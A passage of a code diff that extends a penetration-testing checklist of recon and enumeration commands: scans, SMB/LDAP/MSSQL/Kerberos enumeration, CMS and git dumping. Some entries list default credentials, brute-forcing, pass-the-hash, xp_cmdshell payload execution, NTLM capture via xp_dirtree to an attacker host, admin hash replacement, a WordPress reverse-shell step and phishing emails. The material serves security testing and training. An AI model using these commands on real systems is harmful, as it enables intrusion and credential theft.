+              "curl -sI target.com | grep -Ei 'x-frame|x-xss|x-content-type|strict-transport|content-security'",
+              "nmap --script http-headers -p 80,443 target.com"
+            ]
+          },
+          {
+            "desc": "robots.txt and sitemap.xml",
+            "subdesc": "Discover hidden paths, admin panels, and API endpoints from robots.txt and sitemaps.",
+            "cmd": [
+              "curl -s target.com/robots.txt",
+              "curl -s target.com/sitemap.xml",
+              "curl -s target.com/sitemap_index.xml",
+              "curl -s target.com/.well-known/security.txt"
+            ]
+          },
+          {
+            "desc": "JavaScript File Analysis",
+            "subdesc": "JS files often contain API endpoints, internal URLs, secrets, and comments with sensitive info.",
+            "cmd": [
+              "# Extract JS file URLs",
+              "curl -s target.com | grep -oP 'src=\"[^\"]*\\.js\"' | sed 's/src=\"//;s/\"//'",
+              "# Analyze JS for endpoints and secrets",
+              "linkfinder -i https://target.com -o cli",
+              "# Search JS files for secrets",
+              "curl -s target.com/app.js | grep -Ei 'api_key|secret|password|token|endpoint|internal'"
             ]
           }
         ]
@@ -857,13 +1671,44 @@ const checklistPhases = [
     "optional": false,
     "items": [
       {
+        "id": "recon-1",
+        "name": "Host Discovery / Ping Sweep",
+        "description": "Identify live hosts on the network before diving into port scans. Use ARP for local subnets, ICMP/TCP for remote ranges.",
+        "commands": [
+          {
+            "desc": "ARP scan (local subnet only)",
+            "subdesc": "Fastest and most reliable on a local LAN — cannot be blocked by host firewalls",
+            "cmd": [
+              "sudo arp-scan -l",
+              "nmap -sn -PR <SUBNET>"
+            ]
+          },
+          {
+            "desc": "ICMP / TCP ping sweep",
+            "subdesc": "Use -sn for host discovery only (no port scan). Add -PE for ICMP echo, -PS for TCP SYN, -PA for TCP ACK",
+            "cmd": [
+              "nmap -sn <SUBNET>",
+              "nmap -sn -PE -PS21,22,25,80,443,445,3389 <SUBNET>"
+            ]
+          },
+          {
+            "desc": "Netdiscover (passive/active ARP)",
+            "subdesc": "Passive mode (-p) listens without sending packets — useful for stealth",
+            "cmd": [
+              "netdiscover -r <SUBNET>",
+              "netdiscover -p -r <SUBNET>"
+            ]
+          }
+        ]
+      },
+      {
         "id": "recon-2",
         "name": "TCP Port Scan (Full)",
         "description": "Full TCP port coverage with OS detection and aggressive scan settings.",
         "commands": [
           {
             "desc": "Full TCP scan with OS and version detection at high speed",
-            "subdesc": "",
+            "subdesc": "Comprehensive scan combining OS detection (-O), default scripts (-sC), version detection (-sV), and aggressive mode (-A)",
             "cmd": [
               "nmap -p- -O -sC -sV -A --min-rate 5000 <TARGET_IP>"
             ]
@@ -877,7 +1722,7 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Scan top 100 UDP ports",
-            "subdesc": "",
+            "subdesc": "UDP scans are slow — focus on top ports for DNS (53), SNMP (161), TFTP (69), NTP (123)",
             "cmd": [
               "nmap -sU --top-ports 100 <TARGET_IP>"
             ]
@@ -891,14 +1736,14 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Attempt anonymous FTP login (use \"passive\" if 229 error)",
-            "subdesc": "",
+            "subdesc": "Check for misconfigured anonymous access — common on older systems",
             "cmd": [
               "ftp anonymous@<TARGET_IP>"
             ]
           },
           {
             "desc": "Grab all files from an anonymous share",
-            "subdesc": "",
+            "subdesc": "Switch to binary mode and disable prompts for bulk file download",
             "cmd": [
               "binary",
               "PROMPT OFF",
@@ -921,14 +1766,14 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Audit SSH server configuration and supported ciphers",
-            "subdesc": "",
+            "subdesc": "Checks for weak algorithms, outdated versions, and known vulnerable configurations",
             "cmd": [
               "ssh-audit <TARGET_IP>"
             ]
           },
           {
             "desc": "Grab SSH banner using legacy key exchange",
-            "subdesc": "",
+            "subdesc": "Use legacy key exchange to connect to older SSH servers that reject modern ciphers",
             "cmd": [
               "ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 <TARGET_IP>"
             ]
@@ -949,14 +1794,14 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Enumerate SMTP users with nmap script",
-            "subdesc": "",
+            "subdesc": "SMTP user enumeration via NSE scripts — discovers valid mailboxes",
             "cmd": [
               "nmap -p 25 --script=smtp-enum-users <TARGET_IP>"
             ]
           },
           {
             "desc": "Manually verify an email address via VRFY",
-            "subdesc": "",
+            "subdesc": "VRFY command confirms if a mailbox exists on the server — manual enumeration",
             "cmd": [
               "nc -nv <TARGET_IP> 25",
               "VRFY <username>"
@@ -964,7 +1809,7 @@ const checklistPhases = [
           },
           {
             "desc": "Send a phishing test email with attachment (SWAKS)",
-            "subdesc": "",
+            "subdesc": "SWAKS = Swiss Army Knife for SMTP — craft and send test emails with attachments",
             "cmd": [
               "swaks --to receiver@mail.com --from sender@mail.com --auth LOGIN --auth-user sender@mail.com --header-X-Test \"Header\" --server <TARGET_IP> --attach file.txt"
             ]
@@ -978,7 +1823,7 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Banner grabbing and DNS version info",
-            "subdesc": "",
+            "subdesc": "Identify DNS software and version for vulnerability research",
             "cmd": [
               "dig @<TARGET_IP> version.bind CHAOS TXT",
               "nmap -sV --script dns-nsid -p53 -Pn <TARGET_IP>"
@@ -986,7 +1831,7 @@ const checklistPhases = [
           },
           {
             "desc": "DNS record enumeration (whois, host, dig)",
-            "subdesc": "",
+            "subdesc": "Query core DNS records to map domain infrastructure",
             "cmd": [
               "whois <DOMAIN>",
               "host <DOMAIN> <TARGET_IP>",
@@ -997,7 +1842,7 @@ const checklistPhases = [
           },
           {
             "desc": "Zone transfer test",
-            "subdesc": "",
+            "subdesc": "If nmap shows a TLS certificate commonName (e.g. mysite.test) and DNS is open, test for zone transfer. A successful transfer can reveal additional server hostnames to enumerate.",
             "cmd": [
               "host -T -l <DOMAIN> <TARGET_IP>",
               "dig @<TARGET_IP> <DOMAIN> AXFR",
@@ -1005,8 +1850,17 @@ const checklistPhases = [
             ]
           },
           {
+            "desc": "DNS configuration files (Linux)",
+            "subdesc": "Check these files on a compromised Linux host for DNS resolver and zone configuration.",
+            "cmd": [
+              "host.conf",
+              "resolv.conf",
+              "named.conf"
+            ]
+          },
+          {
             "desc": "Subdomain enumeration (gobuster and ffuf)",
-            "subdesc": "",
+            "subdesc": "Active DNS brute-forcing through the target DNS server",
             "cmd": [
               "gobuster dns -r <TARGET_IP> -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 100",
               "ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H \"Host: FUZZ.<RHOST>\" -fs 185"
@@ -1021,24 +1875,45 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Fingerprint web server with nmap http-enum",
-            "subdesc": "",
+            "subdesc": "Discovers directories, default pages, and web server technology info",
             "cmd": [
               "nmap -p 80 -sV --script=http-enum <TARGET_IP>"
             ]
           },
           {
             "desc": "Grab HTTP headers and follow redirects",
-            "subdesc": "",
+            "subdesc": "Response headers reveal server software, redirects, and security policies",
             "cmd": [
               "curl -IL http://<TARGET_IP>"
             ]
           },
           {
             "desc": "Technology fingerprinting with WhatWeb",
-            "subdesc": "",
+            "subdesc": "Detect CMS, frameworks, server software, and CDN providers",
             "cmd": [
               "whatweb -a 3 http://<TARGET_IP>",
               "whatweb --no-errors <TARGET_SUBNET>/24"
+            ]
+          },
+          {
+            "desc": "Default credentials to try on login portals",
+            "subdesc": "Always check for common credentials or unchanged manufacturer defaults on any admin panel or login page.",
+            "cmd": [
+              "admin:admin",
+              "administrator:administrator",
+              "admin@domain:admin",
+              "admin:password",
+              "administrator:password",
+              "guest:guest",
+              "root:",
+              "admin:password123"
+            ]
+          },
+          {
+            "desc": "SSL/TLS certificate inspection",
+            "subdesc": "Certificates can reveal email addresses, company names, and subdomains — useful for phishing or further enumeration.",
+            "cmd": [
+              "openssl s_client -connect <TARGET_IP>:443"
             ]
           }
         ]
@@ -1085,7 +1960,7 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Run a full Nikto scan and save output",
-            "subdesc": "",
+            "subdesc": "Checks for dangerous files, outdated software, misconfigurations, and known vulnerabilities",
             "cmd": [
               "nikto -h http://<TARGET_IP> -o nikto_output.txt"
             ]
@@ -1099,16 +1974,17 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Anonymous and null session login attempts",
-            "subdesc": "",
+            "subdesc": "Try anonymous, null password, and no-pass variants to discover accessible shares.",
             "cmd": [
               "smbclient -L //<TARGET_IP> -U anonymous",
               "smbclient -N -L //<TARGET_IP>",
+              "smbclient --no-pass //<TARGET_IP>/anonymous",
               "smbclient -N //<TARGET_IP>/<SHARE>"
             ]
           },
           {
             "desc": "CrackMapExec enumeration (users, password policy, shares)",
-            "subdesc": "",
+            "subdesc": "Null session enumeration — RID brute-force finds users even when listing is disabled",
             "cmd": [
               "crackmapexec smb <TARGET_IP> -u \"\" -p \"\" --users --rid-brute",
               "crackmapexec smb <TARGET_IP> -u \"\" -p \"\" --pass-pol",
@@ -1118,25 +1994,27 @@ const checklistPhases = [
           },
           {
             "desc": "Enum4Linux and nmap SMB scripts",
-            "subdesc": "",
+            "subdesc": "Full SMB enumeration — OS discovery, known vulnerabilities, and NetBIOS scanning",
             "cmd": [
               "enum4linux -a <TARGET_IP>",
               "nmap -v -p 139,445 --script smb-os-discovery <TARGET_IP>",
-              "nmap --script smb-vuln* -p 139,445 <TARGET_IP>"
+              "nmap --script smb-vuln* -p 139,445 <TARGET_IP>",
+              "sudo nbtscan -r <TARGET_SUBNET>"
             ]
           },
           {
             "desc": "Authenticated SMB login (password and NTLM hash)",
-            "subdesc": "Inside smbclient: RECURSE ON / PROMPT OFF / mget *",
+            "subdesc": "Inside smbclient: RECURSE ON / PROMPT OFF / mget * to grab all files recursively.",
             "cmd": [
               "smbclient //<TARGET_IP>/SYSVOL -U <USER>",
               "smbclient -p 445 //<TARGET_IP>/<SHARE> -U <USER> --password=<PASS>",
-              "smbclient -L //<TARGET_IP> -U <DOMAIN>/<USER> --pw-nt-hash <HASH>"
+              "smbclient -L //<TARGET_IP> -U <DOMAIN>/<USER> --pw-nt-hash <HASH>",
+              "pth-smbclient //<TARGET_IP>/<SHARE> -U '<DOMAIN>\\<USER>%<NTLM_HASH>'"
             ]
           },
           {
             "desc": "Bruteforce SMB credentials with Hydra",
-            "subdesc": "",
+            "subdesc": "Use -t 1 for SMB to avoid account lockouts",
             "cmd": [
               "hydra -L users.txt -P passwords.txt -t 1 -vV smb://<TARGET_IP>"
             ]
@@ -1150,21 +2028,21 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Scan subnet for open SNMP ports",
-            "subdesc": "",
+            "subdesc": "Discover hosts running SNMP — often left with default community strings",
             "cmd": [
               "nmap -sU --open -p 161 <TARGET_SUBNET> -oG open-snmp.txt"
             ]
           },
           {
             "desc": "Bruteforce SNMP community strings",
-            "subdesc": "",
+            "subdesc": "Try common strings like public, private, manager against discovered SNMP hosts",
             "cmd": [
               "onesixtyone -c <COMMUNITY-STRINGS-LIST> -i <IP-RANGES>"
             ]
           },
           {
             "desc": "SNMP walk with public community string",
-            "subdesc": "",
+            "subdesc": "Dump all SNMP MIB data — may reveal system info, processes, and network config",
             "cmd": [
               "snmpwalk -c public -v1 -t 10 <TARGET_IP>"
             ]
@@ -1188,7 +2066,7 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Anonymous LDAP enumeration with auto-derived base DN",
-            "subdesc": "",
+            "subdesc": "Automatically derives base DN from domain name for anonymous LDAP queries",
             "cmd": [
               "target_domain='domain.tld'",
               "target_hostname=\"DC01.${target_domain}\"",
@@ -1198,7 +2076,7 @@ const checklistPhases = [
           },
           {
             "desc": "Alternative anonymous LDAP queries",
-            "subdesc": "",
+            "subdesc": "Query naming contexts first, then enumerate all objects under the base DN",
             "cmd": [
               "ldapsearch -x -h <TARGET_IP> -s base namingcontexts",
               "ldapsearch -x -h <TARGET_IP> -s sub -b 'DC=domain,DC=tld'"
@@ -1206,7 +2084,7 @@ const checklistPhases = [
           },
           {
             "desc": "Authenticated LDAP search and full object dump",
-            "subdesc": "",
+            "subdesc": "With valid creds — dump sAMAccountNames or all objects for offline analysis",
             "cmd": [
               "ldapsearch -x -H ldap://<TARGET_IP> -D '<DOMAIN>\\<USER>' -w '<PASS>' -b 'DC=domain,DC=tld' sAMAccountName",
               "ldapsearch -x -H ldap://<TARGET_IP> -b $domain_component 'objectClass=*'"
@@ -1221,14 +2099,14 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "MSSQL enumeration using nmap scripts",
-            "subdesc": "",
+            "subdesc": "Comprehensive NSE scan — checks empty passwords, xp_cmdshell, NTLM info, and hash dumping",
             "cmd": [
               "nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <TARGET_IP>"
             ]
           },
           {
             "desc": "Connect with impacket MSSQL client",
-            "subdesc": "",
+            "subdesc": "Interactive MSSQL client — supports Windows auth and domain credentials",
             "cmd": [
               "impacket-mssqlclient Administrator:Pass@<TARGET_IP> -windows-auth",
               "impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<TARGET_IP>"
@@ -1236,9 +2114,8 @@ const checklistPhases = [
           },
           {
             "desc": "Basic database queries",
-            "subdesc": "",
+            "subdesc": "Enumerate version, databases, tables, and data after connecting",
             "cmd": [
-              "select @@version;",
               "SELECT name from sys.databases;",
               "USE <database-name>;",
               "SELECT * FROM <database>.INFORMATION_SCHEMA.TABLES;",
@@ -1247,7 +2124,7 @@ const checklistPhases = [
           },
           {
             "desc": "Enable and use xp_cmdshell for OS command execution",
-            "subdesc": "",
+            "subdesc": "If the command is too long for xp_cmdshell, use the mssql-command-tool to execute directly.",
             "cmd": [
               "enable_xp_cmdshell",
               "EXEC sp_configure 'show advanced options', 1;",
@@ -1259,34 +2136,73 @@ const checklistPhases = [
           },
           {
             "desc": "Force NTLM authentication capture with xp_dirtree",
-            "subdesc": "",
+            "subdesc": "Use Responder or similar to capture the NTLM hash when the target connects to your share.",
             "cmd": [
               "EXEC xp_dirtree '\\\\<LHOST>\\share'"
+            ]
+          },
+          {
+            "desc": "MSSQL command tool (bypass xp_cmdshell length limits)",
+            "subdesc": "Use when xp_cmdshell truncates long commands like base64-encoded PowerShell payloads.",
+            "cmd": [
+              "./mssql-command-tools_Linux_amd64 --host <TARGET_IP> -u \"sa\" -p '<PASSWORD>' -c \"powershell -e <BASE64_PAYLOAD>\""
             ]
           }
         ]
       },
       {
         "id": "recon-15",
-        "name": "MySQL Enumeration (3306)",
-        "description": "MySQL login, version check, database listing, and data extraction.",
+        "name": "MySQL / MariaDB Enumeration (3306)",
+        "description": "MySQL and MariaDB login, version check, database listing, data extraction, and credential replacement.",
         "commands": [
           {
             "desc": "Login to MySQL server",
-            "subdesc": "",
+            "subdesc": "Connect with credentials — use --skip-ssl-verify-server-cert for self-signed certs",
             "cmd": [
               "mysql -u <username> -p <password> -h <TARGET_IP> -P 3306 --skip-ssl-verify-server-cert"
             ]
           },
           {
+            "desc": "Login to MariaDB server",
+            "subdesc": "MariaDB uses the same SQL syntax as MySQL.",
+            "cmd": [
+              "mariadb -h <TARGET_IP> -u <username> -p <password>"
+            ]
+          },
+          {
             "desc": "Check version, current user, list databases, and query tables",
-            "subdesc": "",
+            "subdesc": "Standard enumeration sequence after gaining database access",
             "cmd": [
               "select version();",
               "select system_user();",
               "show databases;",
               "use <database-name>;",
               "select * from <table> \\G"
+            ]
+          },
+          {
+            "desc": "Replace admin credentials in a table",
+            "subdesc": "If you find a user table with hashed passwords, replace the admin hash with one you control.",
+            "cmd": [
+              "UPDATE <table> SET password='<YOUR_HASH>' WHERE user_id='ADM';"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "recon-15b",
+        "name": "SQLite3 Enumeration (Local)",
+        "description": "Enumerate local SQLite3 database files found on a compromised host.",
+        "commands": [
+          {
+            "desc": "Open and query a SQLite3 database",
+            "subdesc": "Common in web apps — look for .db, .sqlite, .sqlite3 files in /var/www, /opt, or application directories.",
+            "cmd": [
+              "sqlite3 <database.db>",
+              ".databases",
+              ".tables",
+              "select * from <table>;",
+              ".quit"
             ]
           }
         ]
@@ -1298,7 +2214,7 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Enumerate RDP encryption, vulnerabilities, and NTLM info",
-            "subdesc": "",
+            "subdesc": "Check for MS12-020 (RCE), weak encryption, and leak NTLM domain info",
             "cmd": [
               "nmap --script \"rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info\" -p 3389 -T4 <TARGET_IP>"
             ]
@@ -1312,7 +2228,7 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Connect to WinRM with evil-winrm",
-            "subdesc": "",
+            "subdesc": "Full interactive PowerShell shell — requires valid credentials and WinRM group membership",
             "cmd": [
               "evil-winrm -i <TARGET_IP> -u <USER> -p <PASS>"
             ]
@@ -1326,7 +2242,7 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Basic user enumeration via Finger",
-            "subdesc": "",
+            "subdesc": "Query for known usernames — blank query lists all logged-in users",
             "cmd": [
               "finger @<TARGET_IP>",
               "finger admin@<TARGET_IP>"
@@ -1334,7 +2250,7 @@ const checklistPhases = [
           },
           {
             "desc": "Automated user enumeration with finger-user-enum.pl",
-            "subdesc": "",
+            "subdesc": "Brute-force valid usernames from a wordlist via Finger protocol",
             "cmd": [
               "finger-user-enum.pl -U users.txt -t <TARGET_IP>",
               "finger-user-enum.pl -u root -t <TARGET_IP>"
@@ -1342,7 +2258,7 @@ const checklistPhases = [
           },
           {
             "desc": "Enumerate against a full wordlist and filter results",
-            "subdesc": "",
+            "subdesc": "Use a large names wordlist and grep for Login to filter valid accounts",
             "cmd": [
               "perl finger-user-enum.pl -t <TARGET_IP> -U /usr/share/wordlists/seclists/Usernames/Names/names.txt | grep -win \"Login\""
             ]
@@ -1356,21 +2272,21 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Enumerate Kerberos users with nmap krb5-enum-users",
-            "subdesc": "",
+            "subdesc": "Enumerate valid domain usernames without credentials via Kerberos pre-auth responses",
             "cmd": [
               "nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=\"/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt\" <TARGET_IP>"
             ]
           },
           {
             "desc": "Enumerate Kerberos users with Kerbrute",
-            "subdesc": "",
+            "subdesc": "Install: go install github.com/ropnop/kerbrute@latest — or download binary from https://github.com/ropnop/kerbrute/releases",
             "cmd": [
               "./kerbrute userenum --dc <TARGET_IP> -d <DOMAIN> /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt"
             ]
           },
           {
             "desc": "Extract SPNs (requires valid credentials)",
-            "subdesc": "",
+            "subdesc": "Request service tickets for cracking offline — Kerberoasting",
             "cmd": [
               "GetUserSPNs.py -request -dc-ip <TARGET_IP> <DOMAIN>/<USER>"
             ]
@@ -1384,16 +2300,16 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "MSRPC enumeration with nmap and rpcclient null/empty auth",
-            "subdesc": "",
+            "subdesc": "Try both -N (null session) and -U ''%'' (empty user/pass) for anonymous access.",
             "cmd": [
               "nmap -A -sV -sC -Pn --script=msrpc-enum <TARGET_IP> -p135",
               "rpcclient <TARGET_IP> -N",
-              "rpcclient -U \"%\" <TARGET_IP>"
+              "rpcclient -U ''%'' <TARGET_IP>"
             ]
           },
           {
             "desc": "Enumerate domain users and groups inside rpcclient",
-            "subdesc": "",
+            "subdesc": "querydispinfo shows user descriptions — may reveal cleartext passwords in comments.",
             "cmd": [
               "enumdomusers",
               "querydispinfo",
@@ -1405,8 +2321,15 @@ const checklistPhases = [
             ]
           },
           {
+            "desc": "Extract domain users to a clean list",
+            "subdesc": "Pipe enumdomusers output into a file and extract just the usernames.",
+            "cmd": [
+              "cat rpcclient_output.txt | awk -F'\\[' '{print $2}' | awk -F'\\]' '{print $1}' > domain_users.txt"
+            ]
+          },
+          {
             "desc": "Change a user's password via RPC",
-            "subdesc": "",
+            "subdesc": "Useful if you have write access to a user object — level 23 sets the password directly.",
             "cmd": [
               "setuserinfo2 <username> 23 <password>"
             ]
@@ -1420,7 +2343,7 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Enumerate IMAP NTLM info with nmap",
-            "subdesc": "",
+            "subdesc": "Extract domain name and server info from IMAP NTLM authentication",
             "cmd": [
               "nmap -p 143 --script imap-ntlm-info.nse <TARGET_IP>"
             ]
@@ -1439,7 +2362,7 @@ const checklistPhases = [
           },
           {
             "desc": "Deliver phishing email with attachment via SWAKS",
-            "subdesc": "",
+            "subdesc": "Deliver crafted phishing email with malicious attachment for initial access",
             "cmd": [
               "swaks --to target@domain --from jonas@domain --attach @file.ods --server <TARGET_IP> --body \"Please check this out\" --header \"Subject: IMPORTANT UPDATE\""
             ]
@@ -1453,7 +2376,7 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Enumerate POP3 capabilities and NTLM auth info",
-            "subdesc": "",
+            "subdesc": "Check POP3 service capabilities and extract NTLM domain information",
             "cmd": [
               "nmap --script pop3-capabilities,pop3-ntlm-info -p110,995 <TARGET_IP>"
             ]
@@ -1467,14 +2390,14 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "List NFS exports on the target",
-            "subdesc": "",
+            "subdesc": "Check for world-readable exports — often expose sensitive files",
             "cmd": [
               "showmount -e <TARGET_IP>"
             ]
           },
           {
             "desc": "Mount the NFS share locally",
-            "subdesc": "",
+            "subdesc": "Mount remote NFS export and browse files directly on your system",
             "cmd": [
               "mkdir nfstarget",
               "sudo mount -t nfs <TARGET_IP>:/mnt/backups/ nfstarget -o nolock"
@@ -1489,14 +2412,14 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Login to PostgreSQL server",
-            "subdesc": "",
+            "subdesc": "Connect with credentials — default user is often postgres",
             "cmd": [
               "psql -h <TARGET_IP> -p 5432 -U <username>"
             ]
           },
           {
             "desc": "List databases, connect, enumerate tables, and query data",
-            "subdesc": "",
+            "subdesc": "Standard PostgreSQL enumeration commands after connecting",
             "cmd": [
               "\\x on",
               "\\l;",
@@ -1514,14 +2437,14 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Detect Oracle TNS listener version",
-            "subdesc": "",
+            "subdesc": "Identify Oracle database version and listener configuration",
             "cmd": [
               "nmap --script oracle-tns-version -p1521 <TARGET_IP>"
             ]
           },
           {
             "desc": "Guess Oracle SIDs with ODAT",
-            "subdesc": "",
+            "subdesc": "Brute-force Oracle SIDs — SID is required to connect to the database",
             "cmd": [
               "odat sidguesser -s <TARGET_IP>"
             ]
@@ -1535,14 +2458,14 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Retrieve Redis server info via CLI",
-            "subdesc": "",
+            "subdesc": "Check for unauthenticated access — Redis often runs with no password",
             "cmd": [
               "redis-cli -h <TARGET_IP> -p 6379 INFO"
             ]
           },
           {
             "desc": "Enumerate Redis with nmap info script",
-            "subdesc": "",
+            "subdesc": "Detect version and configuration details via NSE scripts",
             "cmd": [
               "nmap --script redis-info -p6379 <TARGET_IP>"
             ]
@@ -1556,14 +2479,14 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Connect to MongoDB shell",
-            "subdesc": "",
+            "subdesc": "Check for unauthenticated access — MongoDB often has no auth enabled",
             "cmd": [
               "mongo --host <TARGET_IP> --port 27017"
             ]
           },
           {
             "desc": "Enumerate MongoDB with nmap scripts",
-            "subdesc": "",
+            "subdesc": "Discover databases and collections via NSE scripts",
             "cmd": [
               "nmap --script mongodb-info,mongodb-databases -p27017 <TARGET_IP>"
             ]
@@ -1577,14 +2500,14 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "List all Elasticsearch indices via API",
-            "subdesc": "",
+            "subdesc": "Unauthenticated REST API often exposes all stored data",
             "cmd": [
               "curl -s http://<TARGET_IP>:9200/_cat/indices?v"
             ]
           },
           {
             "desc": "HTTP enum scan on Elasticsearch port",
-            "subdesc": "",
+            "subdesc": "Discover Elasticsearch endpoints and plugins via NSE scripts",
             "cmd": [
               "nmap --script http-enum -p9200 <TARGET_IP>"
             ]
@@ -1598,14 +2521,14 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Retrieve Memcached server stats via netcat",
-            "subdesc": "",
+            "subdesc": "Check for unauthenticated access — Memcached rarely has auth enabled",
             "cmd": [
               "echo stats | nc <TARGET_IP> 11211"
             ]
           },
           {
             "desc": "Enumerate Memcached with nmap info script",
-            "subdesc": "",
+            "subdesc": "Detect version and dump cached key statistics",
             "cmd": [
               "nmap --script memcached-info -p11211 <TARGET_IP>"
             ]
@@ -1619,7 +2542,7 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Enumerate VNC info and display title with nmap",
-            "subdesc": "",
+            "subdesc": "Detect VNC version and check for no-password auth",
             "cmd": [
               "nmap --script vnc-info,vnc-title -p5900 <TARGET_IP>"
             ]
@@ -1633,9 +2556,242 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Run NSE vuln scripts against open ports",
-            "subdesc": "",
+            "subdesc": "Broad vulnerability scan — run after enumeration to check for known CVEs",
             "cmd": [
               "nmap --script vuln -p<OPEN_PORTS> <TARGET_IP>"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "recon-32",
+        "name": "Content Management Systems",
+        "description": "Scan and enumerate common CMS platforms (WordPress, Drupal, Joomla) for vulnerabilities, plugins, themes, and users.",
+        "commands": [
+          {
+            "desc": "WordPress – Basic Usage",
+            "subdesc": "Enumerate vulnerable plugins, themes, and database exports",
+            "cmd": [
+              "wpscan --url <target> --enumerate vp, vt, dbe"
+            ]
+          },
+          {
+            "desc": "WordPress – Extended Enumeration",
+            "subdesc": "Full scan with TLS bypass — enumerate plugins, themes, and users",
+            "cmd": [
+              "wpscan --url <target> --disable-tls-checks --enumerate p --enumerate t --enumerate u"
+            ]
+          },
+          {
+            "desc": "WordPress – Admin Editor (Reverse Shell)",
+            "subdesc": "Appearance -> Theme Editor -> 404 Template — replace it with a malicious reverse shell!",
+            "cmd": [
+              "Appearance -> Theme Editor -> 404 Template"
+            ]
+          },
+          {
+            "desc": "Drupal – Basic Usage",
+            "subdesc": "An alias has already been created for this.",
+            "cmd": [
+              "droopescan scan drupal -u <target> --enumerate all"
+            ]
+          },
+          {
+            "desc": "Joomla – Basic Usage",
+            "subdesc": "An alias has already been set for this.",
+            "cmd": [
+              "joomscan <target-ip>"
+            ]
+          },
+          {
+            "desc": "Joomla – Specific Endpoint",
+            "subdesc": "Target a specific Joomla endpoint for focused scanning",
+            "cmd": [
+              "joomscan -u http://<target.com>/<end-point>"
+            ]
+          },
+          {
+            "desc": "Joomla – Multiple Targets",
+            "subdesc": "Batch scan multiple Joomla targets from a file",
+            "cmd": [
+              "joomscan -m <targets>.txt"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "recon-33",
+        "name": "Subdomain & Virtual Host Enumeration",
+        "description": "Discover subdomains and virtual hosts that may expose hidden web applications, admin panels, or dev environments on shared hosting.",
+        "commands": [
+          {
+            "desc": "ffuf virtual host discovery",
+            "subdesc": "Fuzz the Host header to find virtual hosts. Filter by response size (-fs) to exclude default pages.",
+            "cmd": [
+              "ffuf -u http://<DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H \"Host: FUZZ.<DOMAIN>\" -mc 200,301,302 -fs <DEFAULT_SIZE>"
+            ]
+          },
+          {
+            "desc": "gobuster vhost mode",
+            "subdesc": "Use --append-domain to automatically append the base domain to each word in the wordlist.",
+            "cmd": [
+              "gobuster vhost --append-domain --wordlist /usr/share/seclists/Discovery/DNS/namelist.txt -u http://<TARGET> | grep 'Status: 200'"
+            ]
+          },
+          {
+            "desc": "gobuster DNS subdomain brute-force",
+            "subdesc": "Resolves subdomains via DNS queries. Increase threads (-t) for faster scans.",
+            "cmd": [
+              "gobuster dns -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 10 -d <DOMAIN>"
+            ]
+          },
+          {
+            "desc": "Virtual host enumeration loop script",
+            "subdesc": "Quickly test a list of potential vhosts by sending curl requests with different Host headers.",
+            "cmd": [
+              "for sub in $(cat /usr/share/seclists/Discovery/DNS/namelist.txt); do echo \"Testing: $sub.<DOMAIN>\"; curl -s -o /dev/null -w \"%{http_code}\" -H \"Host: $sub.<DOMAIN>\" http://<TARGET_IP>; echo; done"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "recon-34",
+        "name": "Git Repository Enumeration",
+        "description": "Detect and dump exposed .git directories from web servers. Analyze commit history for secrets, credentials, and sensitive configuration changes.",
+        "commands": [
+          {
+            "desc": "Dump an exposed .git directory from a web server",
+            "subdesc": "git-dumper reconstructs the full repo from a publicly accessible .git folder. Install: pip install git-dumper.",
+            "cmd": [
+              "git-dumper http://<TARGET>/.git <LOCAL_OUTPUT_PATH>"
+            ]
+          },
+          {
+            "desc": "Scan for secrets with Gitleaks",
+            "subdesc": "Gitleaks scans for hardcoded credentials, API keys, and tokens in repos. Use 'dir' for local folders or 'git' for commit history.",
+            "cmd": [
+              "gitleaks dir -v",
+              "gitleaks git -v"
+            ]
+          },
+          {
+            "desc": "Review commit history for sensitive changes",
+            "subdesc": "Check the git log for interesting commits, then diff between them to find removed passwords or config changes.",
+            "cmd": [
+              "git log --oneline",
+              "git show <COMMIT_ID>",
+              "git diff <COMMIT_1> <COMMIT_2>"
+            ]
+          },
+          {
+            "desc": "Grep through repository for keywords",
